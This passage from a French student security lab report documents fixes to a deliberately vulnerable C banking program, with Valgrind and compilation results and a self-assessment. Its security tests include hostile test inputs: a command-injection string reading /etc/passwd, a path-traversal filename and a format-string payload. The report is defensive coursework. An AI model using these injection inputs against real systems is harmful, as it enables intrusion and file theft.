        effacer_memoire(users[i].hash, TAILLE_HASH);
    }
}
```

**Modifications effectuées** :
1. Taille allouée fixe (33 octets), indépendante de toute donnée d'entrée.
2. Retour de `malloc()` vérifié ; en cas d'échec de `RAND_bytes`, le bloc est
   libéré et la fonction renvoie `NULL` sans avoir rien modifié.
3. Contenu tiré de `RAND_bytes()` : 128 bits, indépendants du nom et de l'index.
4. `clone_user()` alloue lui aussi un jeton, sinon `cleanup()` ferait un `free()`
   sur un pointeur non initialisé.
5. `cleanup()` appelée depuis le point de sortie unique de `main()`, qui utilise
   maintenant `while(running)`.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
La taille écrite est connue à la compilation et ne dépend plus d'une entrée.
Deviner le jeton demanderait de parcourir 2^128 valeurs.

La boucle de cleanup() parcourt MAX_USERS et pas user_count : un jeton peut
avoir été alloué sans que le compteur soit incrémenté. free(NULL) est défini par
la norme et ne fait rien, donc parcourir les 20 emplacements est correct. Comme
les pointeurs sont remis à NULL, un deuxième appel à cleanup() ne fait rien, ce
qui évite un double-free.
```

**Tests effectués** :
```bash
valgrind --leak-check=full --show-leak-kinds=all ./secure < scenario.txt
# → in use at exit: 0 bytes in 0 blocks
# → All heap blocks were freed -- no leaks are possible
# → ERROR SUMMARY: 0 errors from 0 contexts
```

---

### Correction #10 : lecture du menu et options de compilation

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `main()`, `compute_stats()`, `Makefile`
**Ligne(s)** : 318-321, 249, Makefile ligne 6 (entrées 24, 35, 37)

**Description** :
```
choice n'est pas initialisée, le retour de scanf("%d") n'est pas vérifié, et le
getchar() ne retire qu'un caractère.

Le Makefile définit -D_FORTIFY_SOURCE=2 sans aucun -O. Les contrôles FORTIFY
reposent sur __builtin_object_size(), qui ne connaît la taille des objets
qu'après l'optimiseur : la macro est définie mais rien n'est généré. La glibc
émet un #warning à chaque compilation, ce qui fait échouer make test-secure
puisqu'elle cherche le mot "warning".
```

**Code vulnérable** :
```c
while(1) {
    display_menu();
    scanf("%d", &choice);
    getchar();
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Sur stdin fermé ou redirigé, scanf retourne EOF sans écrire et while(1) tourne à
100 % de CPU. C'est déclenché par la commande de test du Makefile lui-même
(echo "0" | ./vulnerable).

Contrairement à ce que j'avais écrit au premier jet, il n'y a pas de boucle
infinie en interactif : le getchar() consomme un caractère par tour et scanf
finit par rebloquer. Le vrai problème dans ce cas, c'est que choice garde sa
valeur précédente et que le switch relance l'action d'avant : taper n'importe
quoi après un menu 4 déclenche un nouveau transfert.
```

**Impact** :
- [ ] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [x] Déni de service (crash)
- [ ] Élévation de privilèges
- [x] Autre : exécution d'une action non demandée, protection inactive

#### ✅ Correction implémentée

**Code corrigé** :
```c
int lire_entier(const char *invite, long min, long max, long *valeur) {
    ...
    errno = 0;
    v = strtol(ligne, &fin, 10);
    if(fin == ligne || *fin != '\0' || errno == ERANGE || v < min || v > max) {
        printf("Valeur invalide (attendu : %ld à %ld)\n", min, max);
        return LECTURE_INVALIDE;
    }
    *valeur = v;
    return LECTURE_OK;
}

r = lire_entier("", 0, 12, &choice);
if(r == LECTURE_EOF) { printf("\nFin d'entrée, fermeture\n"); running = 0; continue; }
if(r != LECTURE_OK) continue;
```
```make
# Ligne d'origine : sans -O, _FORTIFY_SOURCE=2 émet un warning et ne protège rien
# CFLAGS_SECURE = -Wall -Wextra -g -fstack-protector-all -D_FORTIFY_SOURCE=2
CFLAGS_SECURE = -Wall -Wextra -g -O2 -fstack-protector-all -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=2
```

**Modifications effectuées** :
1. `strtol()` avec vérification que la ligne entière a été consommée, plus
   `errno == ERANGE` et les bornes métier.
2. `LECTURE_EOF` termine la boucle, `LECTURE_INVALIDE` la fait recommencer.
3. `while(running)` remplace `while(1)`, avec un point de sortie unique.
4. `sprintf` remplacé par `snprintf` dans `compute_stats()`.
5. `-O2` ajouté au Makefile, `-U_FORTIFY_SOURCE` pour éviter le warning
   « macro redefined » sur Ubuntu.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
La lecture d'un entier ne peut plus produire ni valeur hors plage, ni valeur
indéterminée. Pour la terminaison, il fallait distinguer LECTURE_INVALIDE, où on
redemande, et LECTURE_EOF, où on sort : sans cette distinction la boucle
continuerait sans jamais rien consommer.

Sur le Makefile : avec -O2, les appels dont la taille de destination est connue
à la compilation sont remplacés par leurs variantes __*_chk, qui arrêtent le
programme en cas de dépassement. Le canari de -fstack-protector-all ne détecte
l'écrasement qu'au retour de la fonction, donc après coup ; FORTIFY bloque
l'écriture avant qu'elle ait lieu.
```

**Tests effectués** :
```bash
printf 'hello\n0\n' | ./secure       # → Valeur invalide (attendu : 0 à 12)
printf '' | ./secure                 # → Fin d'entrée, fermeture   [code retour 0]
make test-secure                     # → ✓ Aucun warning
```

---

### Bonus implémentés

En plus des 10 corrections, deux mesures de la liste « BONUS » des consignes,
qui coûtaient peu de lignes :

**Salage des mots de passe** (entrée 12) : sel de 128 bits par compte, tiré par
`RAND_bytes()` et régénéré à chaque changement de mot de passe. Détaillé en
correction #5.

**Comparaison en temps constant** (entrée 15) :
```c
ok = (CRYPTO_memcmp(candidat, users[id].hash, TAILLE_HASH) == 0);
```
`CRYPTO_memcmp` parcourt toujours les 32 octets. `memcmp()` de la bibliothèque C
ne convient pas : elle est optimisée pour s'arrêter au premier octet différent,
et sa durée révèle la longueur du préfixe commun. Sur cette application en ligne
de commande, la mesure serait de toute façon noyée dans les E/S du terminal, mais
le même code derrière une API réseau serait exploitable.

**Limitation des tentatives de connexion** (entrée 16) :
```c
if(users[id].echecs >= MAX_ECHECS) {
    printf("Compte verrouillé après %d échecs\n", MAX_ECHECS);
    return -1;
}
if(!verifier_mdp(id, password)) {
    users[id].echecs++;
    return -1;
}
users[id].echecs = 0;
```
Le verrouillage vaut pour la durée du processus et il n'y a pas de temporisation.
N'importe qui peut donc bloquer le compte d'un autre en échouant trois fois
exprès : une attente progressive serait mieux.

Le quatrième bonus (logs de sécurité) n'a pas été fait, faute de temps.

---

## 3. TESTS DE VALIDATION <a name="tests"></a>

Environnement : Ubuntu 24.04 (WSL2), gcc 13.3.0, OpenSSL 3.0.13, Valgrind 3.22.0.

### 3.1 Compilation

**Commande utilisée** :
```bash
gcc -o secure secure.c -lcrypto -Wall -Wextra
```

**Résultat** :
```
(aucune sortie)
```

Avec les options du Makefile :
```
$ make clean && make secure
🔒 Compilation de la version SÉCURISÉE...
gcc -Wall -Wextra -g -O2 -fstack-protector-all -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=2 -o secure secure.c -lcrypto
✓ secure compilé avec succès

$ make test-secure
Test 1: Compilation sans warnings
✓ Aucun warning
```

**Nombre de warnings** : **0**
**Nombre d'erreurs** : **0**

J'ai eu un `-Wformat-truncation` dans `clone_user()` : gcc voyait un tampon local
de 64 octets copié vers un champ de 16 et ne pouvait pas savoir que
`nom_valide()` limite déjà à 15. Réglé en dimensionnant le tampon local à la
taille du champ de destination.

Vérification qu'aucune fonction dangereuse ne subsiste :
```bash
$ grep -nE '\b(gets|strcpy|strcat|sprintf|scanf)\s*\(' secure.c
71: * Remplace les 4 gets() (lignes 105, 181, 224, 229) et les 10 scanf("%s").
99: * Remplace les scanf("%d") des lignes 70, 120 et 320. scanf ne signalait pas
182: * Correction 9 : remplace sprintf(token, "TOK_%d_%s", ...) dans un malloc(32)
494:    /* Correction 4 - ligne 230 : strcpy() copiait jusqu'à 80 octets dans un
592:        /* Correction 10 - ligne 320 : scanf("%d") sans contrôle du retour. Sur
```
Les cinq occurrences restantes sont dans mes propres commentaires.

---

### 3.2 Tests fonctionnels

| Fonctionnalité | Test effectué | Résultat |
|---------------|---------------|----------|
| Création utilisateur | Nom de 43 caractères | OK : « Nom invalide : 3 à 15 caractères » |
| Connexion | Mauvais mot de passe | OK : « ✗ Échec de connexion » |
| Connexion | 4 tentatives erronées | OK : « Compte verrouillé après 3 échecs » |
| Profil | 300 caractères au prompt | OK : « Saisie trop longue (79 caractères maximum) » |
| Profil | `%p %p %p %n` | OK : affiché littéralement |
| Transfert | Montant négatif (-500) | OK : « Valeur invalide (attendu : 1 à 1000000) » |
| Transfert | Montant supérieur au solde | OK : « Solde insuffisant » |
| Backup | Nom de fichier avec `../` | OK : « Nom de fichier invalide » |
| Backup | Nom valide | OK : `backup_moi.txt`, contenu `bob:0:100` |
| Restauration | `../../../etc/passwd` | OK : « Nom de fichier invalide » |
| Commande système | Utilisateur non-admin | OK : « Accès refusé » |
| Commande système | Administrateur, choix 1 | OK : `Thu Jul 30 17:39:02 CEST 2026` |
| Changement mot de passe | `master_reset_2024` | OK : « Ancien mot de passe incorrect » |
| Changement mot de passe | 17 caractères (ex-élévation) | OK : `Admin: NON` après l'opération |
| Menu | Saisie non numérique | OK : « Valeur invalide (attendu : 0 à 12) » |
| Menu | Fin de flux (stdin vide) | OK : « Fin d'entrée, fermeture » |

Chaque test se rejoue en redirigeant les entrées du menu vers le programme, par
exemple pour le montant négatif :
```bash
printf '1\nbob\nPassw0rd1\nPassw0rd1\n2\nbob\nPassw0rd1\n4\nadmin\n-500\n0\n' | ./secure
```

---

### 3.3 Analyse mémoire (Valgrind)

**Commande** :
```bash
printf '1\nbob\nPassw0rd1\nPassw0rd1\n2\nbob\nPassw0rd1\n3\ntest\n5\nmoi\n6\nmoi\n8\nclone_bob\n12\nbob\n11\n9\n0\n' \
  | valgrind --leak-check=full --show-leak-kinds=all ./secure
```

Le scénario couvre la création de compte, la connexion, le profil, un backup,
une restauration, un clonage, une recherche, les statistiques et la liste,
c'est-à-dire tous les chemins qui allouent de la mémoire.

**Résultat** :
```
==3204==     in use at exit: 0 bytes in 0 blocks
==3204== All heap blocks were freed -- no leaks are possible
==3204== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
```

**Fuites détectées** : **0** bytes
**Blocs non libérés** : **0**

---

### 3.4 Tests de sécurité

**Test 1 - Buffer Overflow**
```bash
# Entrée testée   : 300 caractères 'A' au prompt du profil
# Résultat attendu : saisie refusée, pas de crash
# Résultat obtenu  : Saisie trop longue (79 caractères maximum)
#
# Sur vulnerable.c, la même entrée donne :
#   *** stack smashing detected ***: terminated
```

**Test 2 - Format String**
```bash
# Entrée testée   : %p %p %p %n
# Résultat attendu : la chaîne s'affiche telle quelle
# Résultat obtenu  : Format d'affichage personnalisé: %p %p %p %n
#
# Sur vulnerable.c, la même entrée affiche des adresses de la pile.
```

**Test 3 - Command Injection**
```bash
# Entrée testée   : menu 7 puis "1 ; cat /etc/passwd"
# Résultat attendu : aucune saisie libre, seules 2 commandes fixes
# Résultat obtenu  : Choix: Valeur invalide (attendu : 0 à 2)
#
# Depuis un compte non administrateur : Accès refusé
```

**Test 4 - Secrets dans le binaire**
```bash
$ strings vulnerable | grep -E 'admin123|master_reset_2024'
admin123
master_reset_2024
$ strings secure | grep -E 'admin123|master_reset_2024'
$                                 # aucun résultat
```

---

## 4. CONCLUSION <a name="conclusion"></a>

### 4.1 Résumé des corrections

**Statistiques** :
- Vulnérabilités identifiées : **37**
- Corrigées : **24 entrées**, par 10 correctifs plus 2 bonus
- Non traitées : **13 entrées**, listées en 4.3
- Vulnérabilités CRITIQUES corrigées : **11 / 11**
- Vulnérabilités HAUTES corrigées : **6 / 8**
- Total de lignes modifiées : `vulnerable.c` fait 402 lignes (320 de code),
  `secure.c` en fait 665 (458 de code).

**Principaux changements** :
1. Une seule fonction de saisie remplace les 4 `gets()` et les 10 `scanf("%s")`.
2. Sel de 128 bits + SHA-256, plus aucun mot de passe stocké.
3. Suppression des secrets en dur et de l'auto-attribution du flag admin.
4. Validation par liste blanche pour les noms d'utilisateur et de fichier.
5. `cleanup()` sur un point de sortie unique, plus aucune fuite mémoire.

---

### 4.2 Difficultés rencontrées

**Problème 1 : distinguer les vraies vulnérabilités des scénarios plausibles**
```
Ma première liste contenait des attaques qui ne fonctionnent pas quand on relit
le code.

J'avais écrit que le débordement des scanf du menu 2 permettait d'écraser
logged_user : faux, la ligne 332 le réaffecte juste après. J'avais annoncé une
boucle infinie à 100 % de CPU dès qu'on tape du texte au menu : ça n'arrive que
sur EOF. Et j'avais classé le débordement de register_user() comme une élévation
de privilèges alors que admin_flag est réécrit trois lignes plus bas.

Pour trancher j'ai vérifié les offsets de la structure.
```

**Problème 2 : atteindre zéro warning**
```
strncpy(), pourtant recommandé dans le tableau des consignes, déclenche
-Wstringop-truncation à -O2. SHA256_Init/Update/Final sont dépréciés depuis
OpenSSL 3.0. Et le Makefile fourni définit _FORTIFY_SOURCE=2 sans -O, ce qui
provoque un #warning de la glibc à chaque compilation : j'ai dû modifier le
Makefile, sinon l'objectif était impossible à atteindre.
```

**Problème 3 : manque de temps**
```
Je n'ai pas eu le temps de tout corriger. J'ai priorisé les 11 vulnérabilités
critiques, qui sont toutes traitées, plus les hautes les plus faciles à régler.
Il reste 13 entrées du tableau non corrigées, listées ci-dessous.
```

---

### 4.3 Vulnérabilités non corrigées et améliorations possibles

**Non corrigées faute de temps** (avec ce que j'aurais fait) :

| # | Vulnérabilité | Correction prévue |
|---|---|---|
| 19 | Restauration accessible sans authentification | Exiger `logged_user >= 0` sur la case 6 du menu |
| 20 | Retours de `fprintf`/`fclose` ignorés | Tester les deux et signaler l'échec d'écriture |
| 22 | Débordement d'entier sur `balance` | Tester `balance > INT_MAX - amount` avant l'addition |
| 23 | Le clone hérite du mot de passe et du flag admin | Passer par `creer_compte()` avec un mot de passe temporaire |
| 27 | Indices de tableau non validés | Une fonction `index_valide(id)` en tête des 6 fonctions |
| 28 | Confirmation du mot de passe jamais comparée | `strcmp(password, confirm)` avant la création |
| 29 | Pas de contrôle d'unicité des noms | `chercher_user(nom) >= 0` avant la création |
| 30 | Pas de politique de mot de passe | Longueur minimale et au moins une lettre et un chiffre |
| 31 | Soldes et statistiques sans authentification | Exiger une session sur les cases 9 et 11 |
| 32 | Énumération par sous-chaîne | Remplacer `strstr()` par une comparaison exacte |
| 33 | Division par zéro | Garde `if(user_count <= 0)` avant la division |
| 34 | Débordement d'entier sur le cumul | Cumuler dans un `long` |
| 36 | Code mort des sessions | Alimenter `sessions[]` à la connexion et appeler `cleanup_sessions()` |

**Sécurité, au-delà du TP** :
- [x] Implémenter un système de salage pour les mots de passe : fait
- [x] Limiter le nombre de tentatives de connexion : fait
- [x] Protection contre les timing attacks : fait
- [ ] Ajouter des logs de sécurité : pas fait
- [ ] Remplacer SHA-256 par une fonction de dérivation lente (PBKDF2, Argon2id).
      C'est le point qui me gêne le plus dans ce que je rends.
- [ ] Désactiver l'écho du terminal pendant la saisie des mots de passe
      (`termios`) : le secret s'affiche à l'écran.
- [ ] Attente progressive après échec, au lieu du verrouillage sec.
- [ ] Ouvrir le backup avec `O_EXCL` et `O_NOFOLLOW` : `fopen` suit les liens
      symboliques.
- [ ] Chiffrer le fichier de backup, qui expose encore les soldes.

---

### 4.4 Apprentissages clés

**Ce que j'ai appris** :
1. J'ai dû réécrire trois de mes scénarios d'attaque après avoir relu ce qu'il y
   avait juste après le débordement. Dans deux cas sur trois, la valeur écrasée
   était réécrite quelques lignes plus bas.
2. Deux `strcpy()` non bornés dans le même programme n'ont pas la même gravité :
   celui de la ligne 72 écrit à l'offset 0, celui de la ligne 230 à l'offset 16
   et tombe donc sur `admin_flag`.
3. gcc refuse carrément de compiler `printf(format)` sur Ubuntu. Je pensais que
   c'était juste un warning.

**Compétences développées** :
- [x] Identification de vulnérabilités
- [x] Utilisation de fonctions sécurisées
- [x] Validation d'entrées
- [x] Gestion mémoire rigoureuse
- [x] Cryptographie appliquée

---

### 4.5 Auto-évaluation

| Critère | Note estimée /20 | Justification |
|---------|------------------|---------------|
| Analyse | 5 /6 | 37 vulnérabilités avec les lignes, scénarios vérifiés dans le code plutôt que supposés. Je n'ai pas regardé les conditions de course sur les fichiers. |
| Corrections | 7 /10 | Les 11 critiques sont corrigées, ça compile sans warning et Valgrind est propre. Mais 13 entrées restent non traitées, dont deux Hautes. |
| Documentation | 3 /4 | Les quatre sections y sont pour chaque correction, et les vulnérabilités non corrigées sont listées avec ce que j'aurais fait. |
| **TOTAL** | **15 /20** | |

---

## ANNEXES

### Annexe A : Checklist de vérification finale

- [x] Tous les `gets()` remplacés par `fgets()` : 4 occurrences
- [x] Tous les `scanf("%s")` sécurisés : 10 occurrences
- [x] Tous les `strcpy()` remplacés : par `snprintf()`, pas par `strncpy()` (justifié en #4)
- [x] Tous les `strcat()` remplacés : aucun dans le code d'origine
- [x] Tous les `sprintf()` remplacés par `snprintf()` : 3 occurrences
- [x] Cryptographie utilise SHA-256 : avec sel de 128 bits
- [x] Pas de mots de passe en clair
- [x] Pas de backdoors
- [ ] Tous les indices de tableaux validés : **non fait** (entrée 27)
- [x] Tous les `malloc()` ont un `free()` correspondant
- [x] 0 fuites mémoire (valgrind)
- [x] 0 warnings de compilation
- [x] Validation stricte des noms de fichiers
- [x] Protection contre command injection

### Annexe B : Références utilisées

1. `man fgets`, `man snprintf`, `man strtol`, `man strncpy` (section BUGS)
2. Documentation OpenSSL 3.0 : `SHA256(3)`, `RAND_bytes(3)`, `CRYPTO_memcmp(3)`
3. OWASP Top 10 : A02:2021, A03:2021, A07:2021
4. CWE-121 (Stack Buffer Overflow), CWE-134 (Format String), CWE-78 (OS Command
   Injection), CWE-22 (Path Traversal), CWE-798 (Hard-coded Credentials)
5. Manuel gcc : `-Wall`, `-Wextra`, `-fstack-protector-all`, `_FORTIFY_SOURCE`

---

**FIN DU RAPPORT**
